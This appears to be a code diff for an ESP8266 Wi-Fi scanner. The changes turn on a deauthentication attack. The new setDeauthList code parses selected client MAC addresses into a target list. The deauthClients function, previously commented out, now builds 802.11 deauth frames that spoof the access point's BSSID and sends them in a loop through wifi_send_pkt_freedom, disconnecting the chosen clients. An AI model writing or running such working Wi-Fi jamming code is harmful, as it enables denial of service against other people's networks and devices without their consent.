@@ -217,48 +217,92 @@ void WiFiScanner::getAPs() { // return list of just APs
 void WiFiScanner::setDeauthList() {
 
   // reset deauth list here optional
+ 
   numToDeauth = 0;
+ Serial.print("Num to deauth: "); Serial.println(numToDeauth);
   
-  for (int i=0; i<numClients; i++) {
-    // copy mac addresses to list of shit to deauth
-    // pls fucking fix this its disgusting
-
+  for (int i=0; i<numClients; i++) { // total client count
+      uint8_t deauthCount =0;
     if(clients[i].indexOf("*") >= 0){
-      numToDeauth++;
-      String deauthCl = clients[i];
+
+
       
+      String deauthCl = clients[i];      
       deauthCl.replace("* ","");
       deauthCl.replace(":","");
+
       for(int j=0; j<12; j+=2){
 
-        uint8_t num = std::strtoul(&deauthCl[j], NULL, 16);
-        uint8_t num2 = std::strtoul(&deauthCl[j+1], NULL, 16);
+        String tmpDeauthCl = deauthCl.substring(j,j+2);
+        
+        // Serial.print(tmpDeauthCl); Serial.print("  ");
+        uint8_t num = std::strtoul(&tmpDeauthCl[0], NULL, 16);
 
-        clientsToDeauth[i*j]= num;
-        clientsToDeauth[(i+1)*j]= num2;
+        clientsToDeauth[(numToDeauth*6)+deauthCount]= num;
+
+        
+        deauthCount++;
+        // clientsToDeauth[(i+1)*j]= num2;
       }
+      Serial.println();
+
+
       // Serial.println();
+      numToDeauth++;
     }
+    
   }
 
 }
 
 void WiFiScanner::deauthClients() {
+
+  wifi_set_channel(WiFi.channel(scrollIndex));
+
+  uint8_t tmpAP[6];
+
+  String tmpAPbssid = WiFi.BSSIDstr(scrollIndex);
+  tmpAPbssid.replace(":","");
+
+  uint8_t maccnt = 0;
+  uint8_t idk; uint8_t idk2;
+
+  for (int i=0; i<12; i+=2) {
+    String meow = tmpAPbssid.substring(i,i+2);
+
+    idk = std::strtoul(&meow[0], NULL, 16);
+    tmpAP[maccnt] = (idk);
+
+    maccnt++;
+  }
+  // Serial.println();
   
-//   wifi_set_channel(WiFi.channel(scrollIndex));
-//   packetSize = sizeof(deauthPacket);
-//   uint8_t deauthpkt[packetSize];
 
-//   memcpy(deauthpkt, deauthPacket, packetSize);
 
-  // memcpy(&deauthpkt[4],  stMac, 6);
-  // memcpy(&deauthpkt[10], apMac, 6);
-  // memcpy(&deauthpkt[16], apMac, 6);
-  // deauthpkt[24] = reason;
+  Serial.println("Deauthing "+numToDeauth);
 
+  for (int j=0; j< numToDeauth; j++) {
+
+    packetSize = sizeof(deauthPacket);
+    uint8_t deauthpkt[packetSize];
+    memcpy(deauthpkt, deauthPacket, packetSize);
+
+    memcpy(&deauthpkt[4],  &clientsToDeauth[(j*6)], 6);
+    memcpy(&deauthpkt[10], tmpAP, 6); // ap
+    memcpy(&deauthpkt[16], tmpAP, 6); // ap
+    deauthpkt[24] = 1;
     
-  //   wifi_set_channel(1);
-  //   bool sent = wifi_send_pkt_freedom(deauthpkt, packetSize, 0) == 0;
+    wifi_set_channel(1);
+    bool sent = wifi_send_pkt_freedom(deauthpkt, packetSize, 0) == 0;
+
+    // Serial.println(&clientsToDeauth[j*6]);
+    Serial.print(j); Serial.print(": ");
+    Serial.println(sent);
+    delay(50);
+
+  }
+  // Serial.println(&clientsToDeauth[0]);
+
 
 
 }
